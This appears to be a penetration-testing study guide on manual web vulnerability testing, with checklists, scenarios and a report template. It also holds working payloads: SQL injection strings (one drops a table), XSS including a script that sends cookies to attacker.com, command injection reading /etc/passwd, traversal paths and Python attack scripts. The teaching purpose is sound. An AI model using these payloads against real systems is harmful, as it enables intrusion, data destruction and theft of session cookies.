# 🔍 Manual Vulnerability Testing

Comprehensive guide to manual testing techniques for identifying vulnerabilities that automated tools might miss.

**Location in Framework:** `web-pentesting/vulnerability-assessment/manual-testing.md`

---

## 🎯 Overview

Manual testing involves human-driven security testing techniques that complement automated scanning. It focuses on logic flaws, business logic vulnerabilities, and context-specific security issues that require human intelligence to identify.

---

## 🛠️ Manual Testing Approach

### Why Manual Testing?
- **Logic flaws** that automated tools cannot detect
- **Context-specific vulnerabilities** unique to business processes  
- **Complex attack chains** requiring multiple steps
- **False positive verification** of automated findings
- **Custom application behavior** analysis

### Manual vs Automated Testing
| Aspect | Manual Testing | Automated Testing |
|--------|----------------|-------------------|
| **Coverage** | Deep, focused | Broad, comprehensive |
| **Speed** | Slower, thorough | Fast, efficient |
| **Accuracy** | High precision | May have false positives |
| **Cost** | Higher skilled resources | Tool licensing costs |
| **Creativity** | Human intuition | Predefined signatures |

---

## 🕷️ Web Application Manual Testing

### Input Validation Testing

#### SQL Injection Testing
```sql
-- Basic SQL injection payloads
' OR '1'='1
' UNION SELECT 1,2,3--
'; DROP TABLE users;--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

-- Time-based blind injection
' AND (SELECT SLEEP(5))--
' OR IF(1=1,SLEEP(5),0)--

-- Boolean-based blind injection  
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
```

**Manual Testing Process:**
1. Identify all input fields and parameters
2. Test each field with various payloads
3. Observe application responses and behavior
4. Confirm vulnerabilities with database queries
5. Document findings with proof of concept

#### Cross-Site Scripting (XSS)
```javascript
// Reflected XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
javascript:alert('XSS')

// DOM-based XSS
#<script>alert('XSS')</script>
#<img src=x onerror=alert(document.cookie)>

// Stored XSS in comments/profiles
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

#### Command Injection
```bash
# Basic command injection
; ls -la
| whoami
& ping -c 4 127.0.0.1
`id`
$(whoami)

# Windows commands
; dir
& ipconfig
| type C:\windows\system32\drivers\etc\hosts
```

### Authentication Testing

#### Brute Force Protection
```python
# Manual brute force testing approach
1. Attempt multiple failed logins
2. Check for account lockout mechanisms  
3. Test rate limiting effectiveness
4. Verify CAPTCHA implementation
5. Test password reset functionality
```

#### Session Management
```http
# Cookie analysis
Cookie: SESSIONID=abc123; Path=/; HttpOnly; Secure

# Session fixation testing
1. Obtain session ID before login
2. Login with valid credentials
3. Check if session ID changes
4. Test session timeout mechanisms
```

### Authorization Testing

#### Horizontal Privilege Escalation
```http
# Test accessing other users' data
GET /profile?user_id=123 HTTP/1.1
# Change to different user ID
GET /profile?user_id=456 HTTP/1.1
```

#### Vertical Privilege Escalation  
```http
# Test administrative functions
GET /admin/users HTTP/1.1
Cookie: session=regular_user_session

# Test role-based access
POST /admin/delete_user HTTP/1.1
user_id=123&confirm=yes
```

---

## 🔧 Manual Testing Tools and Techniques

### Browser-Based Testing

#### Developer Tools Inspection
```javascript
// Console-based testing
document.cookie
localStorage
sessionStorage
window.location.href = 'javascript:alert(document.cookie)'
```

#### Network Tab Analysis
- Monitor HTTP requests/responses
- Identify hidden parameters
- Analyze API calls and responses
- Check for sensitive data exposure

### Proxy-Based Testing

#### Burp Suite Manual Testing
```http
# Request modification
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"password","admin":true}
```

#### Request Tampering
- Modify HTTP methods (GET to POST)
- Add/remove parameters
- Change content types
- Manipulate headers

### Command Line Testing

#### cURL for API Testing
```bash
# Basic API testing
curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token"

# Parameter manipulation
curl -X POST "http://target.com/api/transfer" \
  -d "from=123&to=456&amount=1000" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Header injection
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
```

---

## 🎯 Business Logic Testing

### Workflow Manipulation
```
Scenario: E-commerce purchase flow
1. Add item to cart ($100)
2. Apply discount code (50% off)  
3. Modify price in HTTP request ($1)
4. Complete purchase at manipulated price
```

### Race Condition Testing
```python
# Concurrent request testing
import threading
import requests

def make_request():
    response = requests.post('http://target.com/transfer',
                           data={'amount': 100, 'to_account': 12345})

# Launch multiple simultaneous requests
for i in range(10):
    thread = threading.Thread(target=make_request)
    thread.start()
```

### Time-Based Attacks
```bash
# Time manipulation testing
# Modify system time in requests
curl -H "Date: Mon, 01 Jan 2000 00:00:00 GMT" http://target.com/api
```

---

## 📋 Manual Testing Checklist

### Pre-Testing Setup
- [ ] Configure proxy tool (Burp Suite, OWASP ZAP)
- [ ] Set up testing browser with developer tools
- [ ] Prepare payload lists and wordlists
- [ ] Document testing scope and objectives
- [ ] Create test user accounts if needed

### Input Validation Testing
- [ ] Test all form fields for injection vulnerabilities
- [ ] Check file upload functionality for restrictions
- [ ] Verify input length limits and validation
- [ ] Test special characters and encoding bypasses
- [ ] Analyze error messages for information disclosure

### Authentication Testing  
- [ ] Test password complexity requirements
- [ ] Verify account lockout mechanisms
- [ ] Check session management implementation
- [ ] Test password reset functionality
- [ ] Analyze multi-factor authentication

### Authorization Testing
- [ ] Test horizontal privilege escalation
- [ ] Verify vertical privilege escalation controls
- [ ] Check role-based access controls
- [ ] Test direct object references
- [ ] Analyze API endpoint permissions

### Business Logic Testing
- [ ] Map all application workflows
- [ ] Test workflow manipulation techniques
- [ ] Verify business rule enforcement
- [ ] Check for race conditions
- [ ] Test edge cases and boundary conditions

---

## 🧪 Practical Testing Scenarios

### Scenario 1: E-commerce Application
```
Target: Online shopping platform
Focus Areas:
- Payment processing manipulation
- Cart tampering techniques  
- Inventory management bypasses
- Discount code abuse
- Account privilege escalation

Manual Tests:
1. Modify product prices in purchase requests
2. Apply multiple discount codes simultaneously  
3. Test negative quantity orders
4. Bypass inventory restrictions
5. Access other users' order history
```

### Scenario 2: Social Media Platform
```
Target: User-generated content platform
Focus Areas:
- Content injection attacks
- Privacy control bypasses
- Account takeover techniques
- Information disclosure
- API abuse

Manual Tests:
1. Inject malicious content in posts/comments
2. Access private profiles/content
3. Test session hijacking vulnerabilities
4. Analyze information leakage in responses
5. Test API rate limiting and abuse
```

### Scenario 3: Banking Application
```
Target: Online banking system
Focus Areas:
- Transaction manipulation
- Account enumeration
- Session management
- Multi-factor authentication bypass
- Financial data exposure

Manual Tests:
1. Modify transaction amounts and recipients
2. Test concurrent transaction processing
3. Bypass authentication mechanisms  
4. Access unauthorized account information
5. Test for timing attacks on PINs/passwords
```

---

## 📊 Manual Testing Documentation

### Finding Documentation Template
```markdown
## Vulnerability: [Title]

**Severity:** Critical/High/Medium/Low
**CVSS Score:** [Score]
**CWE:** [Common Weakness Enumeration ID]

### Description
[Detailed vulnerability description]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]  
3. [Step 3]

### Proof of Concept
[Code/Screenshots/Commands]

### Impact
[Business and technical impact]

### Remediation
[Specific fix recommendations]
```

### Evidence Collection
- **Screenshots** with annotations
- **HTTP requests/responses** showing vulnerability
- **Command line output** demonstrating exploitation
- **Video recordings** for complex attack chains
- **Network captures** when relevant

---

## 🎯 eJPT Manual Testing Focus

### Core Manual Testing Skills
1. **Input validation testing** across all application inputs
2. **Authentication bypass** techniques and session analysis
3. **Authorization testing** for privilege escalation
4. **Business logic analysis** and workflow manipulation
5. **Manual verification** of automated tool findings

### Common eJPT Manual Tests
```bash
# SQL injection manual verification
sqlmap -u "http://target.com/search?q=test" --batch --dbs

# XSS manual testing
# Test in browser developer console
<script>alert('XSS Test')</script>

# Command injection verification  
; cat /etc/passwd
| whoami
```

### Key Manual Testing Areas
- **Web application inputs** (forms, parameters, headers)
- **Authentication mechanisms** (login, password reset, MFA)
- **Session management** (cookies, tokens, timeouts)
- **File upload functionality** (restrictions, execution)
- **API endpoints** (parameter manipulation, rate limiting)

---

## 🔄 Advanced Manual Techniques

### Time-Based Analysis
```python
# Measuring response times for blind vulnerabilities
import time
import requests

def test_blind_sqli(payload):
    start_time = time.time()
    response = requests.get(f'http://target.com/search?q={payload}')
    end_time = time.time()
    return end_time - start_time

# Test with sleep payload
time_taken = test_blind_sqli("'; WAITFOR DELAY '00:00:05';--")
if time_taken > 5:
    print("Potential blind SQL injection detected")
```

### Response Analysis
```python
# Analyzing response patterns
def analyze_responses(payloads):
    for payload in payloads:
        response = requests.post('http://target.com/login', 
                               data={'username': 'admin', 'password': payload})
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code}")
        print(f"Length: {len(response.text)}")
        print(f"Time: {response.elapsed.total_seconds()}")
```

### Custom Script Development
```python
# Custom vulnerability testing script
import requests
import re

def test_directory_traversal(base_url, file_paths):
    traversal_payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd'
    ]
    
    for payload in traversal_payloads:
        response = requests.get(f'{base_url}?file={payload}')
        if re.search(r'root:.*:0:0:', response.text):
            return f"Directory traversal found with payload: {payload}"
    
    return "No directory traversal detected"
```
